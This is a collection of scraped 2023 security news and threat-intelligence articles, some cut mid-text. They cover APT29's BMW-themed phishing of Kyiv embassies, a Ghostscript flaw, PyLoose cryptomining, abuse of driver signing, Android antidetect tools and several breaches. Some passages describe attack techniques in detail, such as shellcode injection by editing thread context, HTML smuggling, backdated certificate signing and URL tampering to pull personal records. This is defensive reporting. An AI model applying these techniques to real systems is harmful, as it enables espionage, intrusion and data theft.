      "text": " July 12, 2023 at 3:00 AMRussia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally. Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following:These types of lures are generally sent to individuals who handle this type of embassy correspondence as part of their daily jobs. They are meant to entice targets to open the files on behalf of the organization they work for.Recently, Unit 42 researchers observed instances of Cloaked Ursa using lures focusing on the diplomats themselves more than the countries they represent. We have identified Cloaked Ursa targeting diplomatic missions within Ukraine by leveraging something that all recently placed diplomats need – a vehicle.Our assessment that Cloaked Ursa is responsible for these lures is based on the following:These unconventional lures are designed to entice the recipient to open an attachment based on their own needs and wants instead of as part of their routine duties.The lures themselves are broadly applicable across the diplomatic community and thus are able to be sent and forwarded to a greater number of targets. They’re also more likely to be forwarded to others inside of an organization as well as within the diplomatic community.Overall, these factors increase the odds of a successful compromise within targeted organizations. While not likely to fully supplant diplomatic operations-themed lures, these lures focusing on individuals do provide Cloaked Ursa with new opportunities and a broader range of susceptible potential espionage targets.Palo Alto Networks customers receive protections against the types of threats discussed in this article by products including:One of the most recent of these novel campaigns that Unit 42 researchers observed appeared to use the legitimate sale of a BMW to target diplomats in Kyiv, Ukraine, as its jumping off point.The campaign began with an innocuous and legitimate event. In mid-April 2023, a diplomat within the Polish Ministry of Foreign Affairs emailed his legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv. The file was titled BMW 5 for sale in Kyiv - 2023.docx.The nature of service for professional diplomats is often one that involves a rotating lifestyle of short- to mid-term assignments at postings around the world. Ukraine presents newly assigned diplomats with unique challenges, being in an area of armed conflict between Russia and Ukraine.How do you ship personal goods, procure safe accommodations and services, and arrange for reliable personal transportation while in a new country? The sale of a reliable car from a trusted diplomat could be a boon for a recent arrival, which Cloaked Ursa viewed as an opportunity.We assess that Cloaked Ursa likely first collected and observed this legitimate advertising flyer via one of the email’s recipients’ mail servers being compromised, or by some other intelligence operation. Upon seeing its value as a generic yet broadly appealing phishing lure, they repurposed it.Two weeks later, on May 4, 2023, Cloaked Ursa emailed their illegitimate version of this flyer to multiple diplomatic missions throughout Kyiv. These illegitimate flyers (shown in Figure 1) use benign Microsoft Word documents of the same name as that sent by the Polish diplomat.The key difference with these illegitimate versions is that if a victim clicks on a link offering “more high quality photos,” a URL shortener service (either t[.]ly or tinyurl[.]com) will redirect them to a legitimate site. This site would have been coopted by Cloaked Ursa, resulting in the download of a malicious payload.When a victim attempts to view any of the “high quality photos” (shown in Figure 2) in the download, the malware executes silently in the background while the selected image displays on the victim’s screen.Figure 3 illustrates the full execution flow.These pictures are actually Windows shortcut files masquerading as PNG image files.We’ve observed two versions of these illegitimate flyers. The only difference between the two is the shortened URL used in each case. The URLs ultimately redirect the victim to the same coopted site (hxxps://resetlocations[.]com/bmw.htm).Overall, we observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv in this campaign, as shown in Table 1. The actual number targeted is likely higher. This is staggering in scope for what generally are narrowly scoped and clandestine APT operations.Known Embassies in Kyiv Targeted by Cloaked Ursa in BMW CampaignFor the activity we observed, Cloaked Ursa used publicly available embassy email addresses for approximately 80% of the targeted victims. The remaining 20% consisted of unpublished email addresses not found on the surface web.This indicates that attackers likely also used other collected intelligence to generate their victim target list, to ensure they were able to maximize their access to desired networks. The majority of the targeted organizations in this campaign were embassies. However, we also observed Cloaked Ursa targeting both Turkish Ministry of Trade representatives in Ukraine (via their ticaret[.]gov[.]tr work emails) and their embassy in the BMW campaign.While there were a handful of emails sent directly to individuals’ work addresses within the campaign, the majority of the targeted emails consisted of general inboxes for the embassy, such as country.embassy@mfa[.]gov[.]xx. Despite the thought and detail put into targets for this campaign, at least two of the email addresses contained errors and never reached the intended targets. Overall, the use of these group inboxes likely increased the odds of the emails being reviewed and passed on to individuals within the embassies looking for transportation.With a few of the embassies we observed being targeted, this was done via group emails hosted on free online webmail services. While these services offer some protection, they also outsource a portion of the security provided to targeted organizations and their employees to external entities. The use of free online webmail could have the unintended consequence of increasing a diplomatic organization’s difficulty in observing and understanding the totality of threats targeting it while also increasing its attack surface.Not one to let a disaster and the highly sympathetic charge it generates go to waste, Cloaked Ursa likely saw a lure providing MFA guidance on humanitarian support for this tragedy as a way to ensure a high level of interest from their targets – these recipients would feel a patriotic obligation and would understand the MFA’s expectations to support their nation and its victims. In addition, given the timely and momentous nature of the lure, it was almost certainly forwarded by concerned employees to others in their organization who would be interested in the guidance.Diplomatic missions will always be a high-value espionage target. Sixteen months into the Russian invasion of Ukraine, intelligence surrounding Ukraine and allied diplomatic efforts are almost certainly a high priority for the Russian government.As the above campaigns show, diplomats should appreciate that APTs continually modify their approaches – including through spear phishing – to enhance their effectiveness. They will seize every opportunity to entice victims into compromise. Ukraine and its allies need to remain extra vigilant to the threat of cyber espionage, to ensure the security and confidentiality of their information.RecommendationsPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including:Palo Alto Networks disclosed this activity to Microsoft and Dropbox.Turkey MFA Payload: Dropbox and MS Graph API Tokens and SecretsThe hyperlinks found within the malicious BMW 5 for sale in Kyiv - 2023.docx flyers (SHA256: 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517 and (SHA256: 8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596) lead to a site (hxxps://resetlocations[.]com/bmw.htm) that was offline in mid-June, but they originally retrieved a large HTA file. (SHA256: 47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b) This HTA file contains roughly 10 MB of Base64-encoded and XORed data, followed by JavaScript code.The JavaScript code would first make a request to the same domain on the URI kll.php, before decoding the embedded data mentioned above and triggering the browser to download it using msSaveOrOpenBlob, or a mix of createElement and createObjectURL should msSaveOrOpenBlob fail. The downloaded file is assigned the name bmw.iso (SHA256: 79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f), matching the theme seen thus far.Once downloaded, execution is reliant on the user clicking the downloaded file, which mounts the disk image to the system and opens up Windows File Explorer. This reveals nine total files masquerading as images, which are instead LNK shortcut files (shown in the execution flow diagram in Figure 3).A hidden folder named $Recycle.Bin is created alongside the LNK files. This folder contains the real PNG images as well as three DLLs, an encrypted payload and a legitimate copy of Microsoft Word named windoc.exe.If one of the LNK files is clicked, the following command line is executed. Note that the image name is changed depending on the LNK file clicked:While windoc.exe is not malicious, it does attempt to load several DLLs on runtime and falls victim to DLL hijacking. As a result, it will load two of the three DLLs within its current directory, namely APPVISVSUBSYSTEMS64.dll (SHA256: 38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534) and MSVCP140.dll. (SHA256: 706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7). The third DLL (Mso20Win32Client.dll) does not appear to be essential to the malware’s functioning and is added so that windoc.exe runs correctly, similarly to the DLL described below.MSVCP140 is not digitally signed, but does not contain any malicious functionality. It appears to only contain a select few exports from a legitimate copy of MSVCP140. It’s likely that this was included to execute windoc.exe on systems that did not have Microsoft Visual C++ Redistributables – at least enough so that it would load APPVISVSUBSYSTEMS64.APPVISVSUBSYSTEMS64, on the other hand, is a fairly obfuscated DLL. It leverages a large number of unnecessary assembly instructions, including the following, likely hindering decompilation efforts and slowing down analysis:APPVISVSUBSYSTEMS64 contains a number of anti-analysis techniques, including the following:If these checks are all passed, the sample will proceed to open the encrypted payload file found within the ISO file, in this case named ojg2.px. (SHA256: c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111). Once read into memory, it will decrypt the file using an XOR operation, which results in a secondary shellcode layer.First, the shellcode is mapped and copied into the remote process using NtMapViewOfSection before a new remote thread is created in a suspended state using NtCreateThreadEx. The interesting aspect of this injection technique is that instead of the created thread pointing to the shellcode entry point or any Windows API, it is given a start address of a function within the APPVISVSUBSYSTEMS64 process. It’s possible that the authors did this to evade monitoring tools from identifying a newly created thread pointing to malicious shellcode.Before the thread is resumed with NtResumeThread, APPVISVSUBSYSTEMS64 will use NtGetContextThread and NtSetContextThread to modify the RCX register (which will contain the thread entry) to point to the entry point of the shellcode.This results in the resumed thread calling RtlUserThreadStart, which will move the value in the RCX register to R9 before calling it, thus triggering the shellcode.The goal of the shellcode is to extract the final executable file payload in memory and transfer execution to it. This payload is the final sample in the infection chain and is responsible for handling communication to and from the command and control (C2) server.For communication, the payload uses both the Microsoft Graph and Dropbox API. Cloaked Ursa has previously leveraged Dropbox as a C2 server. However, Cloaked Ursa’s use of Microsoft Graph API to facilitate C2 communications appears to be a relatively new addition to their toolkit.In addition to the string encrypted tokens and API keys required to communicate with these platforms, there is another string that stands out (shown in Figure 6), used when communicating with the Microsoft Graph API: Teams_test.Given that the Graph API allows for interacting with a number of different Microsoft 365 Services including Microsoft Teams, it’s possible that this was an initial test for communicating via Teams or the Graph API.If communication fails via the Graph API several times, communication via Dropbox is attempted. Several decrypted strings in the binary provide insight into the use of Dropbox for communication:In this sample, it appears that they have opted to use BMP files. The threat actor-owned C2 will upload commands to Dropbox that are wrapped in the BMP format. These commands are retrieved by the payload and then parsed, decrypted and executed. Any data that the payload uploads to Dropbox will also be encrypted and wrapped in the BMP format.In terms of handled commands, the payload accepts five possible requests from the C2 server, as described in the table below.Based on the lack of additional commands, it’s likely this is merely a loader for a further sample. As of mid-June, the Dropbox and Graph API credentials are no longer valid, preventing access to any information that was uploaded to either platform.We identified an additional sample with similar characteristics to other attributed Cloaked Ursa campaigns, which we believe to have been targeting the Turkish Ministry of Foreign Affairs. We did not observe the lure or lures used in this campaign, but we are able to identify the attack chain after the original lure. We assess that the original lure enticed the target to click on hxxps:// simplesalsamix[.]com/e-yazi.html. The URL is no longer active, but it originally retrieved an HTTP smuggling file named e-yazi.html (SHA256: cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a).The downloaded file is assigned the name e-yazi.zip. (SHA256: 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839). This sample contains five files.Once again, a legitimate WinWord.exe binary was found within the archive, named e-yazi.docx.exe. However, whitespace was added between the .docx and .exe, resulting in the file appearing as a document file.Alongside the WinWord.exe, a file named APPVISVSUBSYSTEMS64.dll (SHA256:60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37) was present once again, as well as a file named okxi4t.z (SHA256: 03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48). This file is similar to the previously mentioned ojg2.px in that it contains encrypted shellcode.On execution of WinWord.exe, APPVISVSUBSYSTEMS64.dll is sideloaded and (assuming the standard anti-analysis checks were passed) it would open and read the data from okxi4t.z before decrypting it and injecting it into the first running process it can.The injected shellcode shares a number of similarities with code seen in the BMW-related sample, such as the following:The final payload within this infection chain is somewhat similar to the BMW-linked final payload, in that it leverages both Microsoft Graph API and the Dropbox API for C2 communication. Instead of Teams_test being the project name, it’s set to mytestworkapp1. The hard-coded API tokens are also different from the initially analyzed sample.Similar obfuscation was employed within this sample, including string encryption and control flow obfuscation via abusing the exception handling structures. However, there are no junk functions added to the sample, resulting in a much smaller file size of 498 KB.Updated July 20, 2023, at 12:43 p.m. PT to change UAC-0029 to UAC-0004. Sign up to receive the latest news, cyber threat intelligence and research from usPlease enter your email address!Please mark, I'm not a robot!© 2023 Palo Alto Networks, Inc.

      "text": " GitHub announced today the introduction of passwordless authentication support in public beta, allowing users who opt-in to upgrade from security keys to passkeys.Passkeys are associated with individual devices like computers, tablets, or smartphones and play a vital role in minimizing the likelihood of data breaches by protecting users against phishing attacks by thwarting credential theft and beach attempts.They also enable logging into applications and online platforms using personal identification numbers (PINs) or biometric authentication methods, such as facial recognition or fingerprints.By eliminating the need to remember and manage unique passwords for every app and website, they also vastly improve user experience and security.To activate passkeys on your account, click your profile photo in the top-right corner of any GitHub page. From there, open the 'Feature Preview' menu and click the 'Enable passkeys' option.\"The next time you sign in with [a] security key, we'll ask you if you want to upgrade it to a passkey, which will re-register it with your passkey provider,\" Singhal said.\"Because passkeys are privacy preserving, you might have to trigger your passkey a few times during that upgrade flow so we can make sure we're upgrading the right credential. Once you do, you're all set for a passwordless experience.\"​This is another step taken by GitHub to enhance software supply chain security by transitioning away from basic password-based authentication.\"We're excited to continue to provide more flexibility, reliability, and security in the ways you can authenticate to GitHub,\" Singhal added on Wednesday."

      "text": " Ghostscript, an open-source interpreter for PostScript language and PDF files widely used in Linux, has been found vulnerable to a critical-severity remote code execution flaw.Considering that Ghostscript is installed by default in numerous Linux distributions and used by software such as LibreOffice, GIMP, Inkscape, Scribus, ImageMagick, and the CUPS printing system, opportunities to trigger CVE-2023-36664 are abundant in most cases.Kroll also comments that the problem affects open-source apps on Windows, too, if those use a port of Ghostscript.The CVE-2023-36664 flaw is related to OS pipes, which allow different applications to exchange data by passing outputs from one as inputs to another.The issue arises from the \"gp_file_name_reduce()\" function in Ghostscript, which appears to take multiple paths and combines and simplifies them by removing relative path references for efficiency.However, if a specially crafted path is given to the vulnerable function, it could return unexpected results, leading to overriding the validation mechanisms and potential exploitation.Additionally, when Ghostscript attempts to open a file, it uses another function called \"gp_validate_path\" to check if its location is safe.However, since the vulnerable function changes the location details before that second function's check, it's trivial for an attacker to exploit the loophole and force Ghostscript to deal with files in locations that should be off-limits.Kroll's analysts created a PoC that is triggered by opening an EPS (Embedded Postscript) file on any application using Ghostscript.In the following demonstration video, the researchers showcase the exploit in Inkscape on Windows, performing actions such as opening the calculator or displaying dialogs to the user.It is recommended that Linux users upgrade to the latest version of Ghostscript, 10.01.2, using their distribution's package manager.Unfortunately, open-source software on Windows that use ports of Ghostscript will naturally require more time to move to the latest version of the tool. Hence extra caution is advised with installs in Windows."

      "text": " The Russian state-sponsored hacking group 'APT29' (aka Nobelium, Cloaked Ursa) has been using unconventional lures like car listings to entice diplomats in Ukraine to click on malicious links that deliver malware.APT29 is linked to the Russian government's Foreign Intelligence Service (SVR) and has been responsible for numerous cyberespionage campaigns targeting high-interest individuals across the globe.In one of the most recent APT29 operations spotted by Unit 42, which started in May 2023, the threat actors use a BMW car advertisement to target diplomats in Ukraine's capital, Kyiv.The sale flier was sent to diplomat's email addresses, mimicking a legitimate car sale circulated two weeks prior by a Polish diplomat preparing to leave Ukraine.When the recipients click on the \"more high-quality photos\" link embedded in the malicious document, they are redirected to an HTML page that delivers malicious ISO file payloads via HTML smuggling.HTML smuggling is a technique used in phishing campaigns that use HTML5 and JavaScript to hide malicious payloads in encoded strings in an HTML attachment or webpage. These strings are then decoded by a browser when a user opens the attachment or clicks a link.Using this technique helps to evade security software as the malicious code is obfuscated and only decoded on rendering in the browser.The ISO file contains what appears to be nine PNG images but are, in reality, LNK files that trigger the infection chain shown in the diagram below.When the victim opens any of the LNK files posing as PNG images, they launch a legitimate executable that uses DLL side-loading to inject shellcode into the current process in memory.Unit 42 reports that this campaign has targeted at least 22 of the 80 foreign missions in Kyiv, including those of the United States, Canada, Turkey, Spain, Netherlands, Greece, Estonia, and Denmark. However, the infection rate remains unknown.Another recent example of APT29's readiness to exploit real-world incidents for phishing is a PDF sent to the Turkish Ministry of Foreign Affairs (MFA) earlier in 2023, guiding humanitarian assistance for the earthquake that struck southern Turkey in February.Unit 42 comments that the malicious PDF was likely shared among MFA's employees and forwarded to other Turkish organizations, as the attack took advantage of the excellent timing.As the conflict in Ukraine persists and evolving developments within NATO threaten to alter the geopolitical landscape, Russian cyber espionage groups are expected to continue and even intensify their efforts to target diplomatic missions."

      "text": " A new fileless malware named PyLoose has been targeting cloud workloads to hijack their computational resources for Monero cryptocurrency mining.PyLoose is a relatively simple Python script with a precompiled, base64-encoded XMRig miner, a widely abused open-source tool that uses CPU power to solve complex algorithms required for cryptomining.According to researchers at Wiz, PyLoose's direct execution from memory makes it incredibly stealthy and challenging to detect by security tools.Fileless malware leaves no physical footprint on the system's drives, so it's less vulnerable to signature-based detection and typically utilizes legitimate system tools (living off the land) to inject malicious code into legitimate processes.Wiz's security researchers first detected PyLoose attacks in the wild on June 22nd, 2023, and have since confirmed at least 200 cases of compromise by the novel malware.\"As far as we know, this is the first publicly documented Python-based fileless attack targeting cloud workloads in the wild, and our evidence shows close to 200 instances where this attack was used for cryptomining,\" explains the new Wiz report.Wiz observed attacks that began by gaining initial access to devices through publicly accessible Jupyter Notebook services, which failed to restrict system commands.The attacker uses an HTTPS GET request to fetch the fileless payload (PyLoose) from a Pastebin-like site, \"paste.c-net.org,\" and load it straight into Python's runtime memory.\"Once the payload is placed within a memory section created via memfd, attackers can invoke one of the exec syscalls on that memory content, treating it as if it were a regular file on disk, and thereby launch a new process.\"This enables attackers to perform payload execution straight from memory, evading most traditional security solutions.The XMRig miner loaded into the compromised cloud instance's memory is a fairly recent version (v6.19.3) that uses the 'MoneroOcean' mining pool to mine for Monero.Wiz could not attribute the PyLoose attacks to any particular threat actor, as the attacker left no useful evidence behind.The researchers comment that the adversary behind PyLoose appears highly sophisticated and stands out from the typical threat actors engaging in cloud workload attacks.Cloud instance administrators are recommended to avoid the public exposure of services susceptible to code execution, use strong passwords and multi-factor authentication to protect access to those services, and place system command execution restrictions."

      "text": " Microsoft blocked code signing certificates predominantly used by Chinese hackers and developers to sign and load malicious kernel mode drivers on breached systems by exploiting a Windows policy loophole.Kernel-mode drivers operate at the highest privilege level on Windows (Ring 0), allowing complete access to the target machine for stealthy persistence, undetectable data exfiltration, and the ability to terminate almost any process.Even if security tools are active on the compromised device, a kernel-mode driver can interfere with their operation, turn off their advanced protection capabilities, or perform targeted configuration modifications to evade detection.With Windows Vista, Microsoft introduced policy changes restricting how Windows kernel-mode drivers could be loaded into the operating system, requiring developers to submit their drivers for review and sign them through Microsoft's developer portal. However, to prevent issues with older applications, Microsoft introduced the following exceptions that allowed older kernel mode drivers to continue to be loaded:By altering the signing date, the threat actors can use older, leaked, non-revoked certificates to sign their drivers and load them into Windows for privilege escalation.HookSignTool is a feature-rich tool released in 2019 on a Chinese software cracking forum, using Windows API hooking alongside a legitimate code signing tool to perform malicious driver signing.The tool uses the Microsoft Detours library for intercepting and monitoring Win32 API calls and a custom implementation of the 'CertVerifyTimeValidity' function named 'NewCertVerifyTimeValidity,' which verifies invalid times.HackSignTool requires the presence of the \"JemmyLoveJenny EV Root CA certificate\" to sign driver files with a backdated timestamp, which is available through the tool's author website.However, using this certificate leaves artifacts in the forged signature, making it possible to identify drivers signed with HookSignTool.RedDriver is a browser hijacker that intercepts browser traffic, targeting Chrome, Edge, and Firefox, as well as an extensive list of browsers popular in China.FuckCertVerify is another tool threat actors use to modify the signature timestamps of malicious kernel-mode drivers, originally made available on GitHub in December 2018 as a game cheat tool.\"FuckCertVerifyTimeValidity works in a similar fashion to HookSignTool in that it uses the Microsoft Detours package to attach to the \"CertVerifyTimeValidity\" API call and sets the timestamp to a chosen date,\" explains Cisco Talos.\"[But] unlike HookSignTool, FuckCertVerifyTimeValidity does not leave artifacts in the binary that it signs, making it very difficult to identify when this tool has been used.\"Both tools require a non-revoked code-signing certificate issued before July 29th, 2015, when Microsoft introduced the policy change, along with the matching private key and password.Cisco's researchers have found more than a dozen certificates in GitHub repositories and Chinese-language forums that can be used by these tools, which are widely used for game cracks that can bypass DRM checks and malicious kernel drivers.In a related advisory published today, Microsoft says that Sophos and Trend Micro also reported this malicious activity. After it was responsibly disclosed, Microsoft revoked associated certificates and suspended developer accounts abusing this Windows policy loophole.\"Additionally, Microsoft has implemented blocking detections (Microsoft Defender 1.391.3822.0 and newer) to help protect customers from legitimately signed drivers that have been used maliciously in post-exploit activity.\"Cisco Talos told BleepingComputer that Microsoft had not assigned a CVE to this abuse as the company does not classify this as a vulnerability.As these drivers provide kernel privileges, they can be used to terminate any software, including protected antivirus processes.While the certificates discovered by Cisco and Sophos have now been revoked, the risk is far from eliminated as further certificates likely remain exposed or stolen, allowing threat actors to continue abusing this Windows policy loophole.Update 7/11/23: Added info from Sophos."

In addition, they come with a version of Magisk Delta from HuskyDG, a popular tool for rooting and customizing Android phones by installing modules containing the “magiskhide” module. However, it’s important to note that regulations in different areas require financial applications to have safeguards that prevent installation and execution on “rooted” devices. Still, some malicious actors continue to find ways to bypass these controls.Mobile devices, particularly those running on Android, are now being exploited by cybercriminals. These individuals use antidetect browsers to mimic a legitimate user’s device fingerprint while using stolen login credentials. By doing this, they can access a victim’s online accounts, like a bank, using their username, password, device fingerprint, MFA token, and a local IP address close to their physical location. Antidetect software can be installed on a cybercriminal’s device or delivered through malware or pirated apps.Newly discovered antidetects on the Dark Web have been found to manipulate mobile device fingerprints, software, and network parameters which are usually examined by anti-fraud systems, according to Resecurity’s latest research. The findings are alarming.Resecurity experts recommend financial institutions to perform fraud prevention efficiency testing and acquisition of such tools in order to stay up to date in light of increasing targeting on mobile applications and payment services by fraudsters.\nCopyright@securityaffairs 2023 "

He told TechCrunch that the leak included data of millions of Bangladeshi citizens, however the exposed data was taken down five days later.Asked how long the data was accessible, Markopoulos says he could not be sure, but he knows it was available from June 27 until July 9, when he discovered it and the issue was fixed. \"The records I found there though were dating back to at least 2021,\" he notes.Markopoulos says he could not be sure if the data had been compromised or used. \"Anyone could've found them out like I did,\" he says. \"I searched some Dark Web forums at some point to see if there was any relative leaks for sale, [and] I didn't find any.\"However it was later discovered that the quantity of people who may have been affected could be a large portion of the total population, as if there were 50 million records discovered, only around 80 million hold a national identity card.Also if the CIRT was contacted on June 27th, this would have clashed with the Eid-ul-Adha festival on June 28th, and offices were closed for 15 days. Markopoulos says from June 27th he contacted two email addresses on an almost daily basis, and to this day has not received a response.It has since been learned that the government website that exposed the data is not the original collector of the data, as the Election Commission collected the data and the National Identity Card Registration Division receives the data from an unnamed source, and stored the data when it was not supposed to have it.Also, the website which exposed the data is under a different node on the organizational chart, as the Ministry of Home Affairs currently does not fall under the same department as the Election Commission, which is where most of the information was stored.According to Markopoulos, finding the data was very simple, as it appeared as a Google search result. \"All I did was follow the instructions that the vulnerable API was telling me — it was showing an error that the word 'register' in the URL should be a number and not a word,\" he explains. \"So I just changed 'register' to 123456789 and it just popped the birth application of a random person with all the relevant data required.\"TechCrunch said it used 10 different sets of data on the public search tool of the government website and were able to verify the data.

Replying to the tweet, Razer said that it was looking into the potential incident by starting an investigation.BleepingComputer has contacted Razer to ask about the validity of the data samples the posted on the hacker forum but we have not received a response at publishing time.However, we have been able to confirm that the leaked accounts are valid and belong to legitimate users on the website.Also, BleepingComputer has found that Razer has reset all member accounts, invalidating their active sessions and requesting them to reset their passwords.Researcher Bob Diachenko discovered in 2020 an unprotected Razer database containing full names, email addresses, phone numbers, customer IDs, order details, and billing and shipping addresses of 100,000 customers.From the data samples leaked this time it appears that the information is more recent, dating to at least December 2022, so the two incidents are most likely unrelated.Update 7/11 - A Razer spokesperson has sent Bleeping Computer the following comment:We were alerted to a potential hack on July 9, 2023 impacting Razer Gold.Upon learning about the breach, the team immediately conducted a thorough review of all Razer’s websites and have taken all necessary steps to secure our platforms.Razer is still in the midst of investigations, and we remain committed to ensuring the digital safety and security of all our customers.Once investigations have concluded, Razer anticipates that we will report this matter to the relevant authorities. Customers who have questions can reach out to DPO@razer.com."

The attackers instigated a series of payload-less email interactions with the intended target to build up trust and a rapport, after which they \"delivered a malicious link to a Google Script macro that would redirect the target to a Dropbox URL.\" There, the target could access a password-protected .RAR file containing a malicious LNK file, which, in turn, downloaded NokNok.The attack is likely part of a broader campaign by the group that, overall, features an updated cyberattack arsenal.In that campaign, the payload was a Windows code that Volexity researchers call PowerStar. Joshua Miller, senior threat researcher at Proofpoint, says that his firm has also tracked the Windows threat, calling it \"GorjoEcho.\" \"GorjolEcho is Proofpoint's name for Volexity's PowerStar,\" he says. \"And NokNok is almost certainly the Mac version of PowerStar/GorjolEcho.\"Proofpoint observed APT35 attempting to deliver GorjolEcho, but when faced with a non-Windows environment, it pivoted to the Apple-specific infection chain using NokNok, he adds.\"This includes adopting LNK files as part of overall attack chains. No longer does the 'click to enable macros' trick work effectively for threat actors delivering malware,\" he says.He claims that using LNK files are not necessarily more dangerous than Word macros, as attack chains that include LNKs may require more human interaction, thereby potentially introducing more opportunities for detection. \"For example, an email may contain a PDF attachment that includes a URL leading to a password-protected zip that contains an LNK to install malware,\" he says, \"Microsoft effectively making macro-enabled documents much less useful for malware delivery has forced threat actors to adapt and try new things, including much more convoluted attack chains.\"Miller adds, \"In the case of APT35, LNKs are an example of their continuous development to increase the effectiveness of their malware delivery. Other attempts have historically included macros and remote template injection.\"\"Proofpoint continues to assess that TA453 operates in support of the Islamic Revolutionary Guard Corps (IRGC), specifically the IRGC Intelligence Organization (IRGC-IO). This assessment is based on a variety of evidence, including overlaps in unit numbering between Charming Kitten reports and IRGC units,\" researchers noted. Why these specific Israeli targets in the latest campaign? Proofpoint's blog pointed out that as Joint Comprehensive Plan of Action negotiations continue and Tehran finds itself increasingly isolated within its sphere of influence, APT35 \"is focusing a large majority of its targeting efforts against the experts likely informing these foreign policies.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Amazon Prime Day runs from July 11-12, but scammers have already started to capitalize on the worldwide shopping event, which promises exclusive deals for a short time only.In the days leading up to the Amazon Prime Day sale, cybersecurity experts are already warning they have seen an uptick in malicious activity aimed at both shoppers and retailers.Trend Micro has been monitoring the rise in cybercrime in the lead-up to Amazon Prime Day, and observed a more than 33% increase in Amazon scams in the week beginning June 28 and running through July 4, compared to the previous week's activity. The Trend Micro team warned that there has also been a jump in DHL-themed shipping scams, aimed mostly at shoppers in Arizona, California, Florida, Oklahoma, and Pennsylvania — it's unclear if that's a related phenomenon.\"Scammers love online shopping customers as they can utilize many holidays — in this case Amazon Prime Day — whereby consumers look to get even better deals than they normally would,” Trend Micro's vice president of threat intelligence, Jon Clay, said in a statement provided to Dark Reading. \"With Amazon Prime's popularity, we continue to see scams targeting this shopping event increase each week until and shortly after Prime Day occurs.\"Besides scamming shoppers, experts including Antoine Vastel, head of research at DataDome, have been tracking the ramp up of bad bot activity, which, heading into Amazon Prime Day, currently accounts for about 30% of all website traffic, he said.Vastel pointed out in a statement provided to Dark Reading that Adobe Analytics pegged last year's Amazon Prime Day sales at $22.4 billion in sales in the US, with nearly $12 billion of that being earned in the single 48-hour Amazon Prime Day window.\"Huge sales like Prime Day represent a lucrative opportunity for retail arbiters to get their hands on hot ticket items for less, only to resell them for profit elsewhere,\" Vastel said. \"For online retailers facing similar challenges, this is bad news: the mass numbers of bots used in scraping can slow their website down significantly, remove their competitive edge, and overall reduce revenue.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " In line with prior expectations, financing deals, and mergers and acquisition (M&A) activity in the cybersecurity sector appears to have dipped in the second quarter. However, analysts tracking the market have a more upbeat assessment for the rest of 2023 — compared to three months ago — with most now expecting a modest recovery on both fronts by the end of the year.\"While the theme of conservatism and expectations for continued headwinds have remained throughout the first half of the year, we do expect to see strategic activity slowly begin to rebound in the second half of 2023 and into 2024,\" says Eric McAlpine, founder and managing partner of analyst firm Momentum Cyber. Financing and M&A activity will both eventually pick up as companies that were able to make do financially so far begin to feel the need for fresh capital to fuel their business, he says.\"As interest rates cooled multiples and the exit market, cybersecurity-focused venture capital (VC) certainly slowed down, particularly in comparison to 2021 and 2022,\" says Alex Doll, partner at cybersecurity investment firm Ten Eleven Ventures. \"Valuations got tighter and the demands of investors to see clear signs of demand and traction were elevated,\" he says. Hiring by VC-backed companies too slowed considerably as companies re-forecast expectations and planned for longer runway times, Doll says.\"While investment in Q2 has been down overall, high-performing companies with solid fundamentals are continuing to receive large rounds of financing, even in a challenging economic environment,\" McAlpine notes.\"It will be interesting to see whether it combines that technology with what it got two months later when it bought Armorblox,\" Turner notes.Crosspoint's purchase price represented an approximately 34% premium over Absolute's share price of $8.58 on May 10, 2023. When the acquisition is complete, Absolute's shareholders will receive $11.50 in cash per common share.\"One thing to watch is how Crosspoint is amassing a veritable stable of cyber firms,\" Turner says. The firm already owns or has stakes in Forescout, ExtraHop, ReversingLabs, Digicert, RSAC, McAfee, Cyware, and others, Turner notes, adding that it's possible that Crosspoint could do some \"corporate engineering\" and bring different bits of these companies together at some point. Or the PE firm could \"simply inject some capital into all of them with a view to spinning them back out when the time is right,\" he says.Meanwhile, Cinven did not disclose the financial details of its purchase of Archer from RSA Security in April. However, data that Momentum Cyber compiled from various industry sources for its second-quarter financial roundup, estimated the transaction value at $1.3 billion.Going forward, Doll from Ten Eleven Ventures says that while VC funding has slowed overall, compared to other sectors, cybersecurity continues to present an attractive opportunity for investors. \"For the right companies, capital is definitely available,\" Doll says. Cybersecurity also continues to be a priority for enterprise organizations, and there are signs of new investments in areas such as AI: \"We think investing in the sector will accelerate again in the next 12 to 18 months,\" Doll notes. \"There's a lot of growth ahead, as attacks persist — in fact, enabled by AI — and new attack vectors, such as AI itself become more apparent.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

